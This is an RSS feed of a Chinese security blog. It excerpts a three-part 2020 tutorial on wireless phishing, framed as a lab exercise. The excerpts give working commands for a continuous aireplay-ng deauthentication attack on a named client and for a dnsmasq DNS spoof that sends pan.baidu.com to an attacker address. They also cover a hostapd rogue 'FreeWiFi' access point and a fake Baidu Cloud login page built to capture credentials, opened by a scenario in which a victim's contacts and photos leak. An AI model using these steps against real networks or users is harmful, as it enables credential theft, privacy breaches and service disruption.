<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>无线钓鱼 on nowhere</title>
    <link>https://killmonday.github.io/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/</link>
    <description>Recent content in 无线钓鱼 on nowhere</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>2020 ownhp. All rights reserved.</copyright>
    <lastBuildDate>Wed, 26 Feb 2020 15:45:06 +0810</lastBuildDate>
    
	<atom:link href="https://killmonday.github.io/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>2020无线钓鱼(3)——Start fishing</title>
      <link>https://killmonday.github.io/posts/2.%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/1.%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC-start-fishing/</link>
      <pubDate>Wed, 26 Feb 2020 15:45:06 +0810</pubDate>
      
      <guid>https://killmonday.github.io/posts/2.%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/1.%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC-start-fishing/</guid>
      <description>想定 这是一个简单的想定：
疫情期间，小黄在家无聊地刷着微博。
突然，他看到其中一条微博里写着 美女图片，点击百度云链接收藏。
小黄眼睛一亮，点击链接 ，浏览器里出现了百度云盘的页面。
小黄选择好文件夹，点击保存，这时，浏览器跳转到百度云登录界面 。
小黄不假思索地输入用户名和口令，点击“登录”按钮 后，浏览器却又跳转回登录界面。
这是怎么回事？小黄百思不得其姐。
2个小时后，
小黄的手机里的百度云盘APP之前自动上传到百度云保存的手机通讯录、相册，被流传到网络上。
小黄感觉天旋地转。
断网攻击 设置监听模式 用 airmon-ng设置无线网卡为监听模式
airmon-ng start wlan0收集目标热点信息 用airodump-ng扫描附近热点，获取目标热点信息（MAC地址，信道）
airodump-ng wlan0获取目标用户信息 用airodump-ng获取目标用户的信息（MAC地址）
airodump-ng -d 8C:BE:BE:2E:C0:50 -c 3 wlan0参数注释：
-d 即BSSID (Basic Service Set Identifier)，目标热点的MAC地址
-c 即channel，信道
wlan0 表示选择使用的无线网卡
-w 写入文件
&amp;ndash;berlin 定义的时间airodump中-ng的窗口将显示连接至路由器设备的量。默认情况下，设备仅显示120秒。为了进行长期监视，我们将其扩展到任意高的值。
deauth攻击 用aireplay-ng 对目标用户进行deauth攻击
aireplay-ng -0 0 -a 8C:BE:BE:2E:C0:50 -c 54:B1:21:56:AA:3C wlan0参数注释： -0 解除认证攻击（deauth，de-authentication）的次数，设为0表示持续攻击
-a 目标AP的MAC地址
-c 目标用户的MAC地址
wlan0 指定攻击所使用的无线网卡
启动钓鱼热点 启动（或重启）hostapd以创建钓鱼热点</description>
    </item>
    
    <item>
      <title>2020无线钓鱼(2)——建立热点</title>
      <link>https://killmonday.github.io/posts/2.%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/1.%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC-%E5%BB%BA%E7%AB%8B%E7%83%AD%E7%82%B9/</link>
      <pubDate>Wed, 26 Feb 2020 13:45:06 +0810</pubDate>
      
      <guid>https://killmonday.github.io/posts/2.%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/1.%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC-%E5%BB%BA%E7%AB%8B%E7%83%AD%E7%82%B9/</guid>
      <description>1.准备DNS、DHCP服务 给我们的钓鱼热点提供自配置的DNS、DHCP服务。
使用自配置的DNS服务，方便我们污染目标的DNS缓存：
DNS服务的解析记录文件，可以直接设置“欲污染的域名”及“域名对应的IP地址”。
而DHCP服务，给受害者提供IP地址、DNS服务器地址、网关地址等。
接下来，我们安装并使用dnsmasq提供DNS、DHCP服务。
安装dnsmasq apt install -y dnsmasq配置dnsmasq 安装后，dnsmasq的默认配置文件路径是/etc/dnsmasq.conf。 编辑dnsmasq.conf
vi /etc/dnsmasq.conf//找到行“#dhcp-range=……”，去掉“#”号，并整行修改为“dhcp-range=172.5.5.100,172.5.5.250,12h”
//找到行“#interface=……”，去掉“#”号，并整行修改为“interface=&amp;lt;无线网卡设备名&amp;gt;”，例如“interface=wlan0”。
//找到行“#addn-hosts=……”，删除“#”并修改为“addn-hosts=/etc/dnsmasq/dns.conf”，表示读取额外hosts路径，而dns.conf文件中则以“IP_addr domain_name”的形式存放dns解析记录
新建文件夹/etc/dnsmasq：
mkdir /etc/dnsmasq创建dns.conf文件：
vi /etc/dnsmasq/dns.conf//文件内容如下：
192.168.31.31 pan.baidu.com2.创建无线热点 安装hostapd hostapd可以把无线网卡切换为AP模式，可以：
 建立OPEN、WEP、WPA、WPA2等无线网络 能设置各种参数，包括频率、信道、Beacon帧发送间隔、是否发送Beacon帧、如何响应Probe Request帧以及MAC地址过滤等。  安装：
apt install -y hostapd配置：
vi /etc/hostapd/open.conf//粘贴以下内容：interface=wlan0ssid=FreeWiFidriver=nl80211channel=1hw_mode=g其中，按需修改的参数有interface,ssid,channel,hw_mode。
参数注释：
interface 无线网卡接口名称ssid 欲创建的热点名称channel 信道hw_mode 无线模式（g表示IEEE 802.11g）注：还可以添加热点口令，设置加密方式等，这里不展开
参考文献： https://www.cnblogs.com/zhuwenger/archive/2011/03/11/1980294.html
收集目标热点信息 创建钓鱼热点前，需要收集附近热点信息，确定一个要伪造的目标热点。
在Kali终端，检查无线网卡是否启用
ifconfig若未启用无线网卡，则启用：</description>
    </item>
    
    <item>
      <title>2020无线钓鱼(1)——环境准备</title>
      <link>https://killmonday.github.io/posts/2.%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/1.%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/</link>
      <pubDate>Tue, 25 Feb 2020 13:00:06 +0810</pubDate>
      
      <guid>https://killmonday.github.io/posts/2.%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/1.%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/%E6%97%A0%E7%BA%BF%E9%92%93%E9%B1%BC/</guid>
      <description>1.硬件准备 USB无线网卡   购买适用于kali linux系统的无线网卡1块，芯片型号有要求。
  我使用的是TP-LINK的网卡，型号TL-WN821N (某东入手)。
  网卡要支持无线AP模式(Master，用于创建钓鱼热点)、监听模式(Monitor，用于WiFi密码破解，数据包注入)。
  参考链接：1，2 ，3
计算机 至少有一台计算机。
手机 一台具有WiFi功能的工作正常的手机。本实验中，它扮演无线钓鱼的受害者。
2.软件准备 VMware Workstation 我使用的虚拟机版本：v14.1.3
Kali Linux 2019虚拟机 在VMware里安装Kali Linux 2019 64位的虚拟机。
TL-WN821N网卡驱动 在Kali虚拟机中安装网卡驱动。
以下操作涉及apt安装软件，需要自行确保Kali系统的网络通畅，以及apt源的有效性（可能需要换源）。
在Kali终端输入：
apt install -y dkmsgit clone https://github.com/Mange/rtl8192eu-linux-driver.gitcd rtl8192eu-linux-driverdkms add .dkms install rtl8192eu/1.0rmmod rtl8xxxumodprobe 8192eu//注意：每次挂起后载入虚拟机，或重启虚拟机，都要执行最后两条命令才可载入网卡驱动
参考文献：1
3.制作钓鱼网站 首先，我们提前为还没创建的钓鱼热点准备好互联网服务，即：
打开kali的路由转发功能——使待会钓鱼热点的数据可以由kali（连上互联网的）网卡代为转发，这样受害者在我们的钓鱼热点里才可以上网。
其次，我们准备一个钓鱼网站。
打开路由转发  去掉“#net.ipv4.ip_forward=1”中的“#”  vi /etc.sysctl.conf 配置iptables，设置NAT  iptables -t nat -A POSTROUTING -o eth0 -s 172.</description>
    </item>
    
  </channel>
</rss>